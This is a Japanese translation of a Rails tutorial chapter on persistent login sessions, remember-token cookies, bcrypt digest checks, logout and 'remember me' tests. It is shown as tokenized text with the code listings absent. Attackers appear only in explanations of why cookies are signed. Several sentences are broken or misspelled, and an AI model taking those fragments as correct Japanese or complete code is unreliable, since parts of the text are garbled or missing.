▁( リスト { p 0} の 他の {2} before _ save {/2} コールバック で 、 {2} email {/2} ではなく {2} self . email {/2} と 記述 して いた 理由 が 、 これ で お わかり いた だけ た と思います )。
▁\ ko de { remember } メソッドの 次の 行 では 、\ ko de { update _ attribute } メソッドで 記憶ダイジェスト を更新し ています
▁(\ ref { sec : updating _ user _ objects } で 説明したように 、 このメソッドは バリデーション を 素 通 り させ ます 。 ここでは ユーザーの パスワード や パスワード 確認 にアクセス できない ので 、 バリデーション を 素 通 り させ なければなりません )。
▁ これはリスト \ ref { code : user _ model _ remember } で使用されていま した 。
▁\ ko de { remember } メソッドを User モデル に追加する
▁\ ko de { user . remember } メソッドが 動作する ようになった ので 、 ユーザーの 暗号化 済み ID と 記憶トークン を ブラウザ の 永 続 cookies に保存 して 、 永 続 セッション を作成する 準備 が できました 。
▁ これを 実際に 行う には \ ko de { cookies } メソッド を使用します 。 このメソッドは 、\ ko de { session } のとき と同様に ハッシュ として 扱 え ます 。
▁ 個 別の cookies は 、 ひとつ の \ ko de { value } ▁( 値 ) ▁ と 、 オプション の \ ko de { expir es } ▁( 有効 期 限 ) ▁ から でき ています 。 有効 期 限 は 省略 可能です 。
▁たとえば 以下のように 、 20 年 後に 期限切れ になる 記憶トークン と同じ 値を cookie に保存 することで 、 永続的 な セッション を 作る ことができます 。
▁上の ように 20 年 で 期限切れ になる cookies 設定 は よく 使われ るように なり 、 今 では Rails にも 特殊な \ ko de { per ma n ent } という 専 用の メソッド が追加され た ほど です 。 この メソッドを使用すると 、 コードは 以下のように シ ン プ ル になります 。
▁ remember _ token
▁ cookies は 今 から 20 年 後に 切 れる ▁(\ text tt { 20 . year s . from _ now })
▁Ruby は 組み込み クラス を含む { 0} あらゆる {/0} クラス に メソッドを 追加 できる ことを { p 1 } で 学 び ました 。
▁ あ のとき は 、\ text tt { palindrome ?} メソッドを \ text tt { String } クラス に追加 しました ▁( つ い で に \ text tt { " de ified "} も 回 文 になっている ことを 発 見 しました )。 また 、 Rails が 実は \ text tt { blank ?} メソッドを \ text tt { Object } クラス に追加 している ことも 判 明 しました ▁( これにより 、\ text tt { " ". blank ?} 、\ text tt { " ▁" . blank ?} 、\ text tt { nil . blank ?} は いずれ も \ text tt { true } になります )。
▁この \ text tt { cookies . per ma n ent } メソッド では 、 cookies が 20 年 後に 期限切れ になる ▁(\ text tt { 20 . year s . from _ now }) ▁ ように 指定 しています が 、 これは Rails の \ emph { time ヘルパー } を使用した 格 好 の例 題 になります 。 time ヘルパーは Rails によって 、 数値 関連 の 基 底 クラス である \ text tt { F i x n um } クラス に追加 されます 。
▁$ ▁ rails ▁console < n > ▁ >> ▁1. year . from _ now < n > ▁=> ▁Sun , ▁0 9 ▁A ug ▁20 15 ▁ 16 : 4 8 : 17 ▁ UTC ▁+00:00 < n > ▁ >> ▁10 . week s . ago < n > ▁=> ▁S at , ▁3 1 ▁Ma y ▁20 14 ▁ 16 : 4 8 : 4 5 ▁ UTC ▁+00:00
▁Rails は 以下のような ヘルパー も 追加 しています 。
▁ >> ▁1. k il o by te < n > ▁=> ▁10 2 4 < n > ▁ >> ▁5 . me g a by te s < n > ▁=> ▁5 2 4 2 88 0
▁上の ヘルパーは 、 ファイルの アップロード に \ text tt { 5 . me g a by te s } などの 制限 を与える の に 便利です 。
▁ メソッドを 組み込み クラス に追加 できる 柔 軟 性 の 高 さ の おかげで 、 純 粋 な Ruby を 極めて 自 然 に 拡 張 することができます ▁( もちろん 注意 して 使う 必要 は あります が )。
▁ 実際 、 Rails の エ レ ガ ン ト な 仕 様 の 多く は 、 背 後 にある Ruby の 高 い 拡 張 性 によって 実現 されている のです 。
▁ユーザー ID を cookies に保存 するには 、\ ko de { session } メソッドで 使用 した の と同じ パターン ▁( リスト \ ref { code : log _ in _ f un c tion }) ▁ を使用します 。 具体的には 以下の ようになります 。
▁しかし このままでは ID が 生 の テキスト として cookies に保存 され てしまう ので 、 アプリケーションの cookies の 形式 が 見え 見え になってしまい 、 攻撃者が ユーザー アカウント を 奪 い 取 ること を 助 け てしまう 可能性があります 。
▁これ を避ける ために 、\ emph { 署 名 付き } cookie を使用します 。 これは 、 cookie を ブラウザ に保存 する 前に 安全 に 暗号化 する ためのものです 。
▁ユーザー ID と 永 続 記憶トークン は ペ ア で 扱 う 必要がある ので 、 cookie も 永 続 化 し なく て は なり ません 。 そこで 、 以下のように \ ko de { signed } メソッドと \ ko de { per ma n ent } メソッドを チ ェ イン ▁( 連 鎖 ) ▁ して 使用します 。
▁ cookies を設定する と 、 以後 の ページの ビューで 以下のように して cookies から ユーザーを 取り 出 せる ようになります 。
▁\ ko de { cookies . signed [: user \_ id ]} では 自動的に ユーザー ID の cookies の 暗 号 が 解 除 され 、 元に戻 ります 。
▁続いて bcrypt を使用し 、\ ko de { cookies [: remember \_ token ]} が \ ko de { remember \_ digest } と 一致する ことを確認します ▁( リスト \ ref { code : user _ model _ remember })。
▁ ところで 、 署 名 された ユーザー ID があれば 記憶トークン は 不要な の では ない か と 疑 問 に 思 う 方 も いる かもしれません 。 しかし 記憶トークン が なければ 、 � 暗号化 された ID を 奪 った 攻撃者 は 、 暗号化 ID を そのまま 使って お 構 い な し に ログイン してしまう でしょう 。
▁ 現在の 設計 では 、 攻撃者が 仮 に 両方 の cookies を 奪 い 取 ること に 成功 した として も 、 本 物 の ユーザーが ログアウト すると ログイン できない ようになっています 。
▁ パ ズ ル も いよいよ 最後の ピ ー ス を 残 す だけ と なりました 。 渡 された トークン が ユーザーの 記憶ダイジェスト と 一致する ことを確認します 。 この 一 致 を bcrypt で 確認 するための 様 々 な 方法 があります 。
▁\ href { https :// github . com / rails / rails / b lo b / master / active model / lib / active _ model / secure _ password . rb } { secure _ password の ソースコード } を調べ てみると 、 以下のような 比 較 を行って いる 箇所 があります
▁\ ref { sec : a _ hash ed _ password } で 解 説 した ように 、「 暗号化 されていない パスワード ▁( un en c ry p t ed ▁ password )」 という 呼 び 方は 正しく ありません 。 ここ で言う セキュア な パスワード とは 、 単 に \ emph { ハッシュ化 した } という 意味 であり 、 本 格 的な 暗号化 は 行 わ れ ていない からです 。
▁ 今回の 場合 、 上のコード を 参 考 に 下 のような コードを し よう し ま s
▁この コードを じ っ く り 調 べ てみると 、 実 に 奇 妙 な つ く り になっています 。 bcrypt で 暗号化 された パスワードを 、 トークン と 直接 比 較 しています 。 ということ は 、\ emph { = = } で 比 較 する 際に ダイジェスト を \ ko de { 復 号 化 } している の でしょう か 。
▁しかし 、 bcrypt の ハッシュ は 復 号 化 できない は ず なので 、 復 号 化 している は ず はありません 。
▁ そこで \ href { https :// github . com / co d a ha le / bcrypt - ruby / b lo b / master / lib / bcrypt / password . rb } { bcrypt ▁gem の ソースコード } を 詳 しく 調 べ てみると 、 な ん と 、 比 較 に 使用している \ ko de { = = } 演算子 が \ emph { 再 定義 } されています 。 実際の 比 較 を コード で 表 す と 、 以下の ようになっています 。
▁ 実際の 比 較 では 、\ ko de { = = } の代わりに \ ko de { is \_ password ?} という 論理値 メソッドが 使用 されています 。
▁これで 少し 見え てきました 。 今 から 書く アプリケーション コード でも これ と同じ 方法 を使用する ことにしましょう 。
▁ 以上 の 説明 を元に 、 ダイジェスト トークン の 比 較 を User モデルの \ ko de { authenticated ?} メソッド の中に 置 け ば よい の では ない か と 推測 できます 。 このメソッドは 、\ ko de { has _ secure _ password } で 提供され る ユーザー 認 証 用の \ ko de { authenticate } メソッド と似ています ▁( リスト \ ref { code : log _ in _ success })。
▁この 実装 結果を リスト \ ref { code : authenticated _ p } に示します 。
▁ ところで 、 この \ ko de { authenticated ?} メソッド ▁( リスト \ ref { code : authenticated _ p }) ▁ は 記憶ダイジェスト と 強 く 結 び つ い ています が 、 実は 他の 様 々 な 用 途 にも 応 用 できます 。 {3} 第 {2} 10 {/2} 章 {/3} では このメソッド を 一 般 化 してみます 。
▁\ ko de { authenticated ?} を追加する
▁ 記憶トークン を参照 している ので 問題 ありません 。 メソッドの 引数 と同じ 名前 を使用すること は よく あります 。
▁ もうひとつ 、\ ko de { remember \_ digest } の 属性 の 使用 法 にご注目ください 。 この 使用 法 は \ ko de { self . remember \_ digest } と同じ であり 、 {1} 第 {2} 6 {/2} 章 {/1} の \ ko de { name } や \ ko de { email } の 使用 法 とも 似 ています 。 remember _ digest の 属性 は 、 データベースの カラム に 対応 して Active ▁Record によって自動的に 作成されます ▁( リスト \ ref { code : add _ remember _ digest _ to _ users _ generated })。
▁これで 、 ログイン ユーザーの 記 憶 処理 を 作る 準備 が 整 い ました 。 \ ko de { remember } ヘルパーメソッド を追加して 、\ ko de { log \_ in } と 連 携 させ ます ▁( リスト \ ref { code : log _ in _ with _ remember })。
▁ ログイン して ユーザーを 保 持 する
▁\ ko de { log \_ in } のとき と同様に 、 リスト \ ref { code : log _ in _ with _ remember } では 実際の Sessions ヘルパー の動作 は 、\ ko de { remember } メソッド 定義 の \ ko de { user . remember } を呼び出す まで 遅 延 され 、 そこで 記憶トークン を生成し て トークン の ダイジェスト を データベースに保存 します 。
▁続いて 上 と同様に 、\ ko de { cookies } メソッドで ユーザー ID と 記憶トークン の 永 続 cookies を作成します 。
▁作成した コードをリスト \ ref { code : remember _ method } に示します
▁ ユーザーを 記 憶 する
▁リスト \ ref { code : remember _ method } のコード では 、 ログイン する ユーザー は ブラウザで 有効な 記憶トークン を 得られ るように 記 憶 されます が 、 リスト { p 2 } で定義した {3} current _ user {/3} メソッド では 一時 セッション しか 扱 って い ないので 、 このままでは 正常に どう さ し ま s
▁ 永 続 セッション の場合は 、\ ko de { session [: user \_ id ]} が 存 在 すれば 一時 セッション から ユーザー を取り出し 、 それ以外の 場合は \ ko de { cookies [: user \_ id ]} から ユーザーを 取り出す して 、 対応する 永 続 セッション に ログイン する必要があります 。
▁これ を行う には 、 以下のように 記述 します 。
▁ これはリスト \ ref { code : find _ authenticate _ user } で使用されていま した 。
▁上のコードは 動作します が 、 今 の ま まで は \ ko de { session } も \ ko de { cookies } も それぞれ 2 回 使用 され てしまい 、 無 駄 です 。
▁ これを 解 消 するには 、 次のように します 。
▁上のコードでは 、 よく 使われ る 以下のような 構造 が 使用 されています が 、 少し 紛 ら わ しい 点 があります 。
▁ 一 見 、 上のコード は 比 較 を行って い るように 見え ます が 、 これは 比 較 では \ emph { ありません } 。 比 較 であれば \ ko de { = = } を使用する はずです が 、 ここでは \ emph { 代入 } を行って います 。
▁ 上 を 以下のように 変更 しました 。
▁ 筆者 は このような 場合 、 代入 式 全体 を かっこ で 囲 む ようにしています 。 これ が 比 較 でない ことを 思い 出 せる ように する ためです 。
▁ 前 述 のように \ ko de { current \_ user } ヘルパー を定義する と 、 リスト \ ref { code : persisten t _ current _ user } のようになります 。
▁ 永続的 セッション の \ ko de { current \_ user } を更新する
▁# ▁ 記憶トークン cookie に対応する ユーザー を返す
▁リスト \ ref { code : persisten t _ current _ user } のコード では 、 新しく ログイン した ユーザー は 正しく 記 憶 されます 。 実際に ログイン して から ブラウザを閉じ 、 アプリケーションを 再 起動 して から もう一度 ブラウザで アプリケーションを 開 い てみると 、 期待どおり 動作 している ことを確認 できます 。
▁その 気 に な れば 、 ブラウザ の cookies を ブラウザで 直接 調 べ て 結果を 確認 することもできます ▁( 図 \ ref { fig : cookie _ in _ browser })
▁ システム で の cookies の 調 べ 方 については 、「 < ブラウザ 名 > ▁in spec t ▁ cookies 」 で グ グ って ください 。
▁ ブラウザ に 記憶トークン の cookies を表示する
▁ アプリケーションに 現在 残 された 問題 は あ と 1 つ だけです 。 ブラウザ の cookies を 削除 する手段 が 未 実装 なので ▁( 20 年 待 て ば 消 え ます が ) 、 ユーザーが ログアウト できません 。
▁ ユーザーが ログアウト できるように するために 、 ユーザーを 記 憶 するための メソッド と同様 の 方法で 、 ユーザーを 忘れ るため の メソッドを 定義 します 。
▁この \ ko de { user . for get } メソッド によって 、\ ko de { user . remember } が 取り 消 されます 。 具体的には 、 記憶ダイジェスト を \ ko de { nil } で 更新 します ▁( リスト \ ref { code : user _ model _ for get })。
▁\ ko de { for get } メソッドを User モデル に追加する
▁リスト \ ref { code : user _ model _ for get } のコード を使用すると 、 永 続 セッション を 終 了 できるように な る 準備 が 整 います 。 終 了 するには 、\ ko de { for get } ヘルパーメソッド を追加して \ ko de { log \_ out } ヘルパーメソッド から 呼び出し ます ▁( リスト \ ref { code : log _ out _ with _ for get })。
▁ 永 続 セッション から ログアウト する
▁# ▁ 永続的 セッション を 破 棄 する
▁ 実は 小さな バグ が 2 つ 残 っています 。 2 つの バグ は 互 い に 強 く 関連 しています 。
▁1 つ目の 地 味 な 問題 です 。 ユーザー は 場合によっては 、 同じ サイト を 複数の ウ ィ ンド ウ ▁( あるいは タブ ) ▁ で 開 い ている こともあります 。 ログアウト 用 リンク は ログイン 中に は 表示 されません が 、
▁ 読者 の P a ul o ▁C é li o ▁ J ú n i or から の ご 指 摘 で した 。 あり が と う ご ざ い ました 。
▁ 読者 の N i e l s ▁ de ▁ R on から の ご 指 摘 で した 。 あり が と う ご ざ います 。
▁ Firefox と C h r o me を使った 具 体 例 で 考えてみましょう 。 ユーザーが Firefox から ログアウト すると 、\ ko de { user . for get } メソッド によって 記憶ダイジェスト が \ ko de { nil } になります ▁( リスト \ ref { code : user _ model _ for get })。
▁ この時点で は 、 アプリケーション は Firefox で まだ 正常に 動作 するはずです 。 つまり 、 リスト { p 0} では {2} log _ out {/2} メソッド によって ユーザー ID が 削除 される ため 、 ハ イ ラ イ ト されている 2 つの 条件 が {2} false {/2} になります 。
▁ 結果 として 、\ ko de { current \_ user } メソッドの 最終的な 評価 結果 は 、 期待どおり \ ko de { nil } になります 。
▁ 結果 として 、 次の \ ko de { if } 文 の 条件 式 が 評価 されます 。
▁このとき に \ ko de { user } が \ ko de { nil } であれば 、 1 番目の 条件 式 で 評価 は 終 了 する のですが 、 実際には nil では ないので 、\ emph { 2 番目の } 条件 式 まで 評価 が 進 み 、 その ときに エラーが発生し ます 。
▁これは 、 Firefox で ログアウト したときに ▁( リスト \ ref { code : user _ model _ for get }) ▁ユーザーの 記憶ダイジェスト が 削除 されている ので 、 C h r o me で アプリケーション にアクセス した とき 、 最終的に 次の 文 を実行する からです 。
▁ 記憶ダイジェスト が \ ko de { nil } になる ので 、 bcrypt ライブラリ 内部で 例外が発生します 。
▁ この問題 を修正する には 、\ ko de { authenticated ?} が \ ko de { false } を返す ように する必要があります 。
▁ テスト駆動開発 は 、 この種の 地 味 な バグ 修正 には う って つ け です 。 そこで 、 2 つの エラー を キャッチ する テストを書く ことにします 。
▁リスト \ ref { code : user _ log out _ test } のとき
▁self を省略した 結果を リスト \ ref { code : test _ do ub le _ log out } に示します 。
▁self を省略した 結果を リスト \ ref { code : destroy _ for get } に示します 。
▁ ログイン 中 の場合 のみ ログアウト する
▁2 番目の 問題 について ですが 、 統合テスト で 2 種類 の ブラウザ を シ ミ ュ レ ート する のは 正 直 かなり 困 難 です 。 その 代 わ り 、 同じ 問題 を User モデル で 直接 テスト する だけ なら 簡単に 行 え ます 。
▁ 記憶ダイジェスト を 持 た ない ユーザーを 用 意 し ▁(\ ko de { setup } メソッド で定義した \ ko de {@ user } インスタンス変数 では true になります ) 、 続いて \ ko de { authenticated ?} を呼び出します ▁( L ist ing ▁\ ref { code : test _ authenticated _ invalid _ token })。
▁この 中 で 、 記憶トークン を 空 欄 の ま ま に している ことにご注目ください 。 記憶トークン が 使用される 前に エラー が発生する ので 、 記憶トークン の値 は 何 でも 構 わ ないので す 。
▁A ▁test ▁of ▁\ ko de { authenticated ?}
▁ エラー を 修正 して テストが ▁\ passing ▁ になる ように するには 、 記憶ダイジェスト が \ ko de { nil } の 場合に \ ko de { false } を返す ように すれば よい のです ▁( リスト \ ref { code : authenticated _ p _ fi x ed })。
▁ U p d at ing ▁\ ko de { authenticated ?}
▁ここでは 、 記憶ダイジェスト が \ ko de { nil } の 場合には \ ko de { return } キーワード で 即 座 に メソッドを 終 了 しています 。 処理 を 中 途 で 終 了 する 場合に よく 使われ る テクニック です 。
▁ 以下のコード でも よい のですが 、
▁ 筆者 は リスト \ ref { code : authenticated _ p _ fi x ed } のように 明示的に return する 方が 、 コードが 若 干 短 くなる ことも あって 好 み です 。
▁リスト \ ref { code : authenticated _ p _ fi x ed } のコード を使用すると 、 テストスイート 全体 が ▁\ passing ▁ になり 、 サブ タイトル は 両方 とも 修正 される はずです 。
▁\ ref { sec : for getting _ users } のコード で 、 アプリケーションに プロ 仕 様 の 完全な 認証システム が 導入 されました 。
▁ 本 章 の 最後に 、[ remember ▁ me ] ▁ チェックボックス で ログイン を 保 持 する方法 を 解説します 。
▁ チェックボックス を追加した モックアップ を 図 \ ref { fig : login _ remember _ me _ mockup } に示します 。
▁[ remember ▁ me ] ▁ チェックボックス のモックアップ
▁ 今回の 実装 は 、 リスト \ ref { code : login _ form } の ログインフォーム に チェックボックス を追加する ところ から 始 め ます 。
▁ チェックボックス は 、 他の ラ ベ ル 、 テキスト フィールド 、 パスワード フィールド 、 送信 ボタン と同様に ヘルパーメソッド で 作成 できます 。
▁ただし 、 チェックボックス が 正常に 動作する ためには 、 以下のように ラ ベ ル の \ emph { 内 側 } に 配置 する必要があります 。
▁ 上 を ログインフォーム に 反 映 した コードをリスト \ ref { code : remember _ me _ check box } に示します 。
▁[ remember ▁ me ] ▁ チェックボックス を ログインフォーム に追加する
▁リスト \ ref { code : remember _ me _ check box } では 、 2 つの CSS クラス \ ko de { check box } と \ ko de { in line } を インクルード しています 。 Bootstrap では これら を チェックボックス と テキスト 「 Re member ▁ me ▁on ▁this ▁ com put er ” 」 として 同じ 行 に 配置 します 。
▁ スタイル を 整 え るため 、 もう少し CSS ルール を追加します ▁( リスト \ ref { code : remember _ me _ css })。
▁ 表示される ログインフォーム を 図 \ ref { fig : login _ form _ remember _ me } に示します 。
▁[ remember ▁ me ] ▁ チェックボックス の CSS
▁{0} 図 8 . 12 {/0} ▁{1} " remember _ token " ▁ チェックボックス を追加した login フォーム {/1}
▁ ログインフォーム の 編集 が 終わっ たので 、 チェックボックス が オン の ときに ユーザーを 記 憶 し 、 オフ のとき には 記 憶 しない ようにします 。
▁ 信 じ られ ない かもしれませんが 、 必要な 準備 はすべて 終わっ ている ので 、 実装 は わずか 1 行 で 終わり ます 。
▁ ログインフォーム から 送信された \ ko de { params } ハッシュ には 既に チェックボックス の 値が 含まれています 。 リスト \ ref { code : remember _ me _ check box } の フォーム に 無効な 値を 入力 して 実際に 送信 すれば 、 ページの デバッグ情報 で 値を 確認 することもできます 。
▁ 特に 、 以下の 値 は 、
▁ チェックボックス が オン の ときに \ ko de { ’ 1 ’ } になり 、 オフ の ときに \ ko de { ’ 0 ’ } になります 。
▁\ ko de { params } ハッシュの この 値 を調べ れば 、 送信された 値 に基いて ユーザーを 記 憶 したり 忘れ たり できるようになります
▁ ユーザーが この チェックボックス を オフ すると 、 すべての コンピュータ 上の すべての ブラウザから ログアウト します ので 、 注意 が必要です 。
▁ ブラウザ ごとに ユーザーの ログイン セッション を 記 憶 する 設計 に変更 すれば 、 ユーザー にとって もう少し 便 利 には なります が 、 その 分 セキュリティ が 低 下 する う え 、 実装 も 面倒 になります 。
▁ や る 気 の 余 っている 方は 実装 して み ても よいでしょう 。
▁ 以前 は \ ko de { remember ▁ user } を かっこ な し で 書き ましたが 、 三 項 演算子 では かっこ を省略 すると 文法 エラー になります 。
▁ Sessions コントローラの \ ko de { create } に 上の 行 を追加した 結果を リスト \ ref { code : remember _ me _ ter n ary } に示します 。 驚 く ほど コ ン パ ク ト な コード に なりました 。
▁ 既に 読者 の 皆 様 は 、 { 0} co st {/0} 変数 の 定義 に 三 項 演算子 を使用した リスト { p 1 } のコード も 理解 できる ようになった ことでしょう 。
▁[ remember ▁ me ] ▁ チェックボックス の 送信 結果を 処理 する
▁リスト \ ref { code : remember _ me _ ter n ary } の実装 によって 、 ログイン システム の実装 が つ い に 完了 しました 。 ブラウザで この チェックボックス を 実際に オン に したり オフ に したり して 、 動作 を 確認 してみましょう 。
▁10 種類 の 人 々
▁ 「 この 世 には 10 種類 の 人 間 が いる 。 三 項 演算子 を 理解 できる 奴 と 、 三 項 演算子 を 理解 できない 奴 だ 。 」 は 、 この 業 界 に 古 く から 伝 わ る ジ ョ ー ク です 。 なお 、「 10 種類 」 は 2 進 法 なので 10 進 法 で 書 け ば 「 2 種類 」 になります 。
▁上の ジ ョ ー ク に 倣 えば 、 この 世 には 10 種類 の 人 々 が います 。 三 項 演算子 を 好 き な 人 、 嫌 い な 人 、 三 項 演算子 を 知 らない 人 です 。
▁ も し 3 番 目 に 該 当 した として も 、 すぐ その カ テ ゴ リ の 人 では なくなります ので ご 心 配 なく 。
▁ プログラミング 経験 を 重 ね る う ち に 、 以下のように 論理値 に応じて 分 岐 する 制 御 フ ロー が 実 に よく 出 現 すること が すぐ に わ か る と思います 。
▁if ▁ boolean ?
▁ 何か を する
▁ else
▁ 別の ことを する
▁Ruby や 他の 言語 ▁( C / C + + 、 P er l 、 P H P 、 J a v a など ) ▁ では 、 上 のような フ ロー を より コ ン パ ク ト な \ emph { 三 項 演算子 ▁( ter n ary ▁ o per at or ) } ▁ と呼ばれる 表現 で 置き換え ることができます ▁( 3 つの 部分 から 構成 される ため その ように 呼ばれ ます )。
▁ 論理値 ? ▁ ?
▁ 何か を する ▁: ▁ 別の ことを する
▁ 以下のような 代入 文 を 三 項 演算子 で 置き換え る こともできます 。
▁ v ar ▁= ▁ foo
▁ v ar ▁= ▁ bar
▁ v ar ▁= ▁ boolean ? ▁ ?
▁ foo ▁: ▁ bar
▁最後に 、 三 項 演算子 を 関数 の 戻り値 として 使用する ことも よく あります 。
▁def ▁ foo < n > ▁do _ st u f f < n > ▁ boolean ? ▁ ?
▁" bar " ▁: ▁" baz "
▁Ruby では 暗 黙 的に 関数 の 最後の 式 の値 を返す ので 、 上の \ text tt { foo } メソッドは 、\ text tt { boolean ?} が \ text tt { true } である か \ text tt { false } である か に応じて 、\ text tt { " bar "} または \ text tt { " baz "} を それぞれ 返します 。
▁[ remember ▁ me ] ▁ 機能 は 既に 快 調 に 動作 しています が 、 ここで 終 わ ら せずに テストを ち ゃ ん と 書き 、 動作 を テスト で 確認 できるように しておくこと が 重要です 。
▁ テストを書く 理由 の ひとつ は 、 今 行った 実装 の エラー を キャッチ できるように することです 。
▁しかし もっと 重要な 理由 は 、 ユーザーを 永 続 化 する コードの 中 心 部分 が 、 実 はまだ まったく テスト されていない からです 。
▁これらの 課題 を 達 成 するには 、 もう少し 新しい テスト の テクニック を 覚 え る必要があります が 、 それ により テストスイート が 一 段 と 強 力 になります 。
▁[ remember ▁ me ] ▁ ボックス をテストする
▁ 恥 を 忍 んで 申 し 上 げ ると 、 筆者 が 自分自身 で リスト \ ref { code : remember _ me _ ter n ary } で チェックボックス の 処理 を 実装 した とき は 、
▁ 最 初 は 上のコード ではなく 、 以下のコード を使用 していました 。
▁この 流れ では 、\ ko de { params [: session ] [: remember \_ me ]} の値 は \ ko de { ’ 0 ’ } または \ ko de { ’ 1 ’ } のいずれか になります が 、 そこ に 罠 があり ました 。 0 も 1 も Ruby の 論理値 では \ ko de { true } である ことを思い出してください 。 従って 、 値 は \ emph { 常に true } になってしまい 、 チェックボックス は 常に オン になっている の と同じ 動作 になってしまい ました 。
▁ この種の ミ ス は ま さ に 、 テスト で キャッチ すべき エラー です 。
▁ ユーザーが 記 憶 される には ログイン が必要です 。 そこで 、 テスト 内で ユーザーが ログイン できるように するための ヘルパーメソッド を定義する こと から 始 め ます 。
▁リスト \ ref { code : user _ login _ test _ valid _ information } では 、\ ko de { post } メソッドと 有効な \ ko de { session } ハッシュ を使用して ログイン しました が 、 毎 回 このような ことを する のは 面倒 です 。
▁ そこで 、\ ko de { log \_ in \_ as } という ヘルパーメソッド を作成して テスト 用 に ログイン できるように し 、 無 駄 な 繰り返し を 排 除 します 。
▁ ログイン に 使用する メソッドは 、 テスト の 種類 によって 異なります 。 統合テスト の 内部で は 、 リスト \ ref { code : user _ login _ test _ valid _ information } のように セッション パス を post します が 、 コントローラ や モデル などの 単 体 テストでは 同じ 方法 が 使 え ません ▁( セッション がない からです )。 後 者 の場合は \ ko de { session } メソッドを 人 為 的に 操作 して 回 避 し なければなりません 。
▁ このため 、\ ko de { log _ in _ as } では テスト の 種類 を 検出 して 、 それ に 応 じ た ログイン を 行える ように する必要があります 。
▁ 統合テスト と その他 のテスト を 区別 するには 、 Ruby の 定 番 である \ ko de { de f in ed ?} メソッド を使用します 。 このメソッドは 、 引数 の内容 が 定義されている 場合は true を 、 その他 の場合は false を返します 。
▁ この場合は 、\ ko de { post _ v i a _ redirect } メソッド ▁( リスト \ ref { code : a _ test _ for _ valid _ submission }) ▁ が 統合テスト の 場合に のみ アクセス 可能 であることを 利用 し 、 以下のような コード を使用します 。
▁上のコードは 、 統合テスト の 実行 中に は \ ko de { true } を返し 、 その他 の 場合には false を返します 。
▁ せ っ か く なので 、 統合テスト を 実行 中 かどうかを 論理値 で 返す \ ko de { integration _ test ?} メソッド を定義し 、 以下のように if - the n ス テ ート メ ン ト を わかりやすく 書く ことにしましょう 。
▁ コメント 部分 に コードを 書 け ば 、\ ko de { log _ in _ as } ヘルパーメソッド が でき あ が ります ▁( リスト \ ref { code : test _ helper _ log _ in })。
▁ 注 : ▁この コメント 部分 に 書く コードは それ なり に 込 み 入 っています 。 可能 であれば 、 一 行 ず つ 読んで 完全に 理解 しておくこと を お す す め します 。 ( 訳 注 : ▁ テスト のコード では 、 操作 を 実現 するために このような ト リ ッ キー な コードを 使 わ ざ る を 得 ない とき があります 。 )
▁\ ko de { log \_ in \_ as } ヘルパー を追加する
▁ テストコード を 最大 限 に 柔 軟 にする ため 、\ ko de { log _ in _ as } メソッド ▁( リスト \ ref { code : test _ helper _ log _ in }) ▁ では \ ko de { options } ハッシュ ▁( リスト \ ref { code : gravatar _ option }) ▁ を 引数に 取り 、 パスワード と ▁[ remember ▁ me ] ▁ チェックボックス の デフォルト値 を それぞれ \ ko de { ’ password ’ } と \ ko de { ’ 1 ’ } に設定し ます 。
▁ 特に 、 キー が存在し ない場合は ハッシュ が \ ko de { nil } を返す ので 、
▁[ remember ▁ me ] ▁ チェックボックス の動作 を確認する ために 、 2 つの テスト を作成します 。 チェックボックス が オン になっている 場合 と オフ になっている 場合 のテスト です 。
▁リスト \ ref { code : test _ helper _ log _ in } で ログイン ヘルパーメソッド を定義し て お いた ので 、 この テストは 簡単に 書く ことができます 。 2 つの テストは それぞれ 以下の ようになります 。
▁上のコード の \ ko de { ’ 1 ’ } は \ ko de { remember \_ me } の デフォルト値 なので 、 1 つ目の テストでは 省略 しても よい のですが 、 2 つの コードを 見 比 べ やすい ように あえて 省略 しません で した 。
▁ ログイン に 成功 すれば 、\ ko de { cookies } 内部 の \ ko de { remember \_ token } キー を調べ ること で 、 ユーザーが 保存 された かどうかを チェック できるようになります 。
▁ cookies の 値が ユーザーの 記憶トークン と 一致する ことを確認 でき れば 理 想 的な のですが 、 現在の 設計 では テスト で この 確認 を行う ことはできません 。 コントローラ 内の \ ko de { user } 変数 には 記憶トークン の 属性 が 含まれています が 、\ ko de { remember \_ token } は 実 在 しない 「 仮 想 」 の もの なので 、\ ko de {@ user } インスタンス変数 の 方 には 含 まれ て いません 。
▁この 課題 は 大 して 難 しく ないので 、\ ref { sec : log _ in _ out _ exercises } の 演習 に 回 す ことにします 。 さ し あ た って 、 今 は 関連する cookies が \ ko de { nil } である かどうか だけ を チェック すれば よい ことにします 。
▁ 実は もうひとつ 地 味 な 問題 があります 。 ある 理由 によって 、 テスト 内で は \ ko de { cookies } メソッド に シンボル を使用 できない のです 。 そのため 、
▁上のコードは 常に \ ko de { nil } になってしまい ます 。
▁ あり が たい ことに 、 文字列 キー なら \ ko de { cookies } で \ emph { 使用できる } ので 、
▁上の ように 書 け ば 期待どおり に 値 が返されます 。
▁ 以上 の 結果を 反 映 した テスト コードをリスト \ ref { code : remember _ me _ test } に示します
▁( リスト \ ref { code : user _ login _ test _ valid _ information } で \ ko de { users (: michael ) } と 書く と 、 リスト \ ref { code : re al _ user _ fixture } の フィクスチャ ユーザー を参照 して いた ことを 思い 出 しましょう )。
▁[ remember ▁ me ] ▁ チェックボックス のテスト
▁ 皆 さ ん が 著者 と同じ 間 違 い を して い なければ 、 この テストは ▁\ passing ▁ になるはずです 。
▁ 記 憶 ブランチ をテストする
▁\ ref { sec : login _ with _ remember ing } では 、 それ まで の 節 で 実装 した 永続的 セッション が 動作する かどうかを 手動で 確認 していました 。 しかし 実は 、\ ko de { current \_ user } 内の ある 分 岐 部分 については 、 これまで まったく テスト が行われ ていない のです 。
▁ 筆者 はこの ことに 気 付 いた 場合に 、 テストを 忘れ ている 疑 い のある コード ブロック 内に わ ざ と 例外 発生 を 仕 込 む という 手法 を 好 んで 使い ます 。 その コード ブロック が テスト から 漏 れ ていれば 、 テストは パス してしまう はずです 。 コード ブロック が テスト から 漏 れ て い なければ 、 例外 が発生し て テストが 中 断 するはずです 。 現在の コード で これ を行って み た 結果を リスト \ ref { code : branch _ raise } に示します 。
▁ テスト されていない ブランチ で 例外を発生 する
▁この 段 階 で テスト を実行し てみると 、 ▁\ passing ▁ になります 。
▁リスト \ ref { code : branch _ raise } のコード が 正 常 でない ことが わ か った 以上 、 これは もちろん 問題 です 。
▁さらに 申 し 上 げ ると 、 この種の 永続的 セッション を 手動で 確認 する のは 非常に 面倒 なので 、\ ko de { current _ user } を リファクタリング する のであれば ▁( {1} 第 {2} 10 {/2} 章 {/1} で 行う 予定です ) ▁ 同時に テスト も 作成 しておくこと が 重要です 。
▁ テスト 手順 は し ん ぷ る です 。
▁ フィクスチャ で \ ko de { user } 変数 を定義する
